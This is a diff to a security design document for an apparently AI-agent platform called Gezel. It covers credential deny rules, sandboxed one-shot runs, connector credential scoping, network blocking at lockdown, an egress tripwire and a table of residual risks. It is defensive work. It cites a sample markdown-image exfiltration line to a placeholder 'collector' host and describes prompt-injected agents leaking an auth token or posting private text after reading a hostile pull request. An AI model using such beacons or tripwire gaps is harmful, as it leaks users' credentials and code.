@@ -588,8 +588,22 @@ Three more layers keep credentials out of what an agent's own tools can reach at
   (`providers/agent-cli-env.ts`); Codex's shell additionally excludes `GEZEL_*`.
 - **Deny rules.** Claude's settings file denies `Read`/`Edit` of the credential files under
   the Gezel home (`anthropic-cli/credential-deny.ts`); a shell ignores those rules, which is
-  why the shell itself is gated. One-shot completions run with no built-ins, in `plan` mode,
-  in an empty folder.
+  why the shell itself is gated.
+- **One-shots run without tools.** A session built with no context (an about, a summary, a
+  script's `llm.oneShot`) runs Claude with no built-ins in `plan` mode and Codex in its
+  read-only sandbox with the shell off, each in an empty folder. Codex's had run in the
+  daemon's own folder with the install's mode and shell, so a prompt could have it print
+  `runtime/auth-token`. Whenever the shell is off, Codex also gets it as a `-c` flag, which
+  beats a `config.toml` and the person's own `-c`, and reaches a Codex that reads the person's
+  own config (`manageRuntimeFiles: false`).
+
+**Agent CLIs are never served to another app.** The `/v1` and Ollama surfaces, the Codex,
+OpenCode, pi and VS Code bridges, and Ollama emulation answer callers that hold an
+`openai`-scope token Gezel hands out without a code, or no token at all on the emulated Ollama
+port. They refuse a turn on `anthropic-cli` or `codex-cli`, named directly or through a gezel
+that runs on one (`openai-compat/caller-providers.ts`), and their model listings leave both out.
+A paired device's `/v1/remote/admit` and `/infer` run only the on-device engines `/models`
+lists: they had run whatever the model string named, including the host's cloud quota.
 
 **Package-command approvals are content-bound.** A persistent approval for
 `run_package_script` or `run_npx` hashes a versioned envelope containing the exact command
@@ -641,6 +655,17 @@ Deep dive: [secrets-security.md](secrets-security.md). Summary of the controls:
   project-owned and are re-read at session build without echoing their values through the API.
 - **Not exfiltratable by the model** — the outbound `fetch_url` screen refuses any request
   whose URL/headers/body contains a stored credential value (`collectProviderSecretValues`).
+  Text a gezel posts to GitHub (a PR comment, a PR's title and body) is refused for a stored
+  value or a secret-shaped string (`http/model-git-gate.ts`).
+- **A connector's credential serves only its connector** — a `script` connector's credential
+  sits in the project's grants so its fetch script can reach it parent-side, and a step script
+  that declared it could spend the person's token on anything at that origin. `http.authed`
+  now spends a `connector-*` credential only in that binding's own sync run
+  (`assertConnectorCredentialUse`, `scripts/dispatcher.ts`). Where a binding sends its
+  credential — a script type's `$config` origins, a native's `destinationKeys` (Bluesky's
+  server, a GitHub Enterprise or Azure API base, a wiki host) — changes only from the person's
+  own app (`isFirstPartyCaller`); the credential's origins follow that edit, and a sync adds
+  only the type's literal origins, never one read from config. Bluesky's server must be https.
 - **System-scope credential** — the daemon root token never leaves process memory. The
   discoverable runtime token is a separately minted `ui`/`openai` client credential. Every
   platform exposes only `runtime/` discovery metadata to local clients; all other machine
@@ -760,6 +785,28 @@ loads live, untrusted pages ([website-connector.md](./website-connector.md),
 The text-only fallback (`http-session.ts`) uses `assertPublicUrl` per redirect hop and
 inherits its DNS-rebinding caveat above.
 
+### 11.0.1 Clones, page checks and rendered messages
+
+At `lockdown` web services are off, but three paths reached the network anyway:
+
+- **`fetch_repo` / `fetch_diff`** checked only the scheme. `planModelClone`
+  (`git/model-clone-policy.ts`) now asks for model git (on at `lockdown`, the coding posture;
+  off at `super-lockdown`) and lets a known public git host (GitHub, GitLab, Bitbucket,
+  Codeberg, Gitea, SourceHut) through over https; any other host needs web services. Both pass
+  the egress tripwire and `assertPublicUrl`, git speaks https only, and a clone from a host that
+  is not known follows no redirect (the settings are written into the clone, so its later
+  fetches keep them). Clone, pull, fetch, push and sync on a linked repository, and GitHub
+  comments and pull requests, refuse a gezel where model git is off (`modelGitRefusal`).
+- **Page-check's Chromium** loads the preview URL, whose CSP blocks remote resources when web
+  services are off, but a CSP does not cover a meta refresh, WebRTC or DNS. Below `free` the
+  runner aborts every request outside the page's origin, points everything else at a proxy
+  that answers nothing, turns WebRTC's UDP and DNS prefetch off and blocks service workers
+  (`page-check/runner.ts`, tested against a real browser).
+- **The VS Code chat webview** allowed `img-src https:`, so a model's
+  `![](https://collector/p.gif?d=…)` was fetched as the message rendered. It now allows
+  `data:` and `blob:` like the app, and wraps the chat in squisq's
+  `LOCAL_ONLY_RESOURCE_POLICY`.
+
 ### 11.1 Egress tripwire on tool calls
 
 `packages/core/src/security/egress-indicators.ts` — `findEgressIndicators` /
@@ -777,7 +824,8 @@ report may still quote these hosts:
 
 - **Gezel's own sinks** read what actually runs: the `package.json` script body and arguments
   (`runPackageScript`), `run_npx` arguments, the Playwright script source, the
-  `run_nodejs_script` file and `derive_file` source, and every `fetch_url` redirect hop.
+  `run_nodejs_script` file and `derive_file` source, every `fetch_url` redirect hop, a clone's
+  address, and text a gezel posts to GitHub (its image proxy fetches whatever a comment embeds).
 - **`McpBridge.callToolRich`** reads all arguments of a call to a bridge that does not serve
   gezel-mcp — third-party toolsets, the Playwright browser, app-registered tools — since no
   Gezel sink stands behind them.
@@ -946,6 +994,9 @@ privileged service identity or putting the daemon root token on disk.
 | Network-on execution without an OS boundary | PARTIAL | Spectral components, and model scripts at `free` where no denyNet boundary exists, run with the network. On Linux without a usable systemd user manager (a container, a server with no session) and on Windows without the container, only the Node layers above stand between them and the account: the permission model, the hardening options and preloads, and the link check. The Spectral origin guard is JavaScript-only and a component can step around it (`_http_client`, `WebSocket`, its own dispatcher). Next: Landlock and signal scoping in `gezel-sandbox`, and Spectral egress through a daemon filter proxy. |
 | File-system boundary on Linux | PARTIAL | No OS layer confines files on Linux; the systemd unit restricts address families only. The link check refuses a link that leads out now, but a script can move a directory holding a relative link so that it leads out afterwards, and a hard link to an outside file (a package store's) is written through. Landlock in `gezel-sandbox` is the fix. |
 | SSRF connect-time IP pin | DEFERRED | Current guard validates at DNS-resolution time (rebinding-window residual). |
+| Agent CLIs behind caller-owned surfaces | ENFORCED | The `/v1`, Ollama and bridge surfaces refuse `anthropic-cli` and `codex-cli`, directly or through a gezel on one, and leave them out of their listings; a paired device reaches only on-device engines (§7.1). |
+| Connector credentials and destinations | ENFORCED | A `connector-*` credential serves only its own binding's sync run; a destination field changes only from the person's app, and a sync never widens a credential's origins (§8). |
+| Gezel posts to GitHub at `lockdown` | PRODUCT CHOICE | Lockdown keeps GitHub read and write for gezels, so after a turn reads a hostile pull request a gezel can still post ordinary text as a comment: the screen stops stored credentials, secret-shaped strings and tripwire addresses, not private code or prose. The fix is a per-project "may post to GitHub" switch or an approval for a post that follows untrusted content. |
 | Egress tripwire coverage (§11.1) | PARTIAL | Lexical and easy to evade on purpose: it targets trained-in habits, not an adversary. Provider-native shells (Claude CLI, Codex CLI, an unsandboxed Copilot) and MCP toolsets those providers call directly never pass the bridge, so their calls are not read. The next layer is a Gezel-owned egress proxy that logs and filters the connections themselves. |
 | Package-script edits by sandboxed scripts | PARTIAL | `run_nodejs_script` / `derive_file` write through Node's permission model, not the Store, so only the workspace's root manifests are snapshotted and put back. A nested workspace package's `scripts` can still change that way while `allowPackageScriptEdits` is off. |
 | URL, Git, local-file, workspace, and alias NPM sources | NOT SUPPORTED | The generic install surfaces intentionally accept registry packages only. If alternate sources become necessary, add a separate explicit consent-gated API with source-specific validation and SSRF controls; do not widen the registry-package parser. |
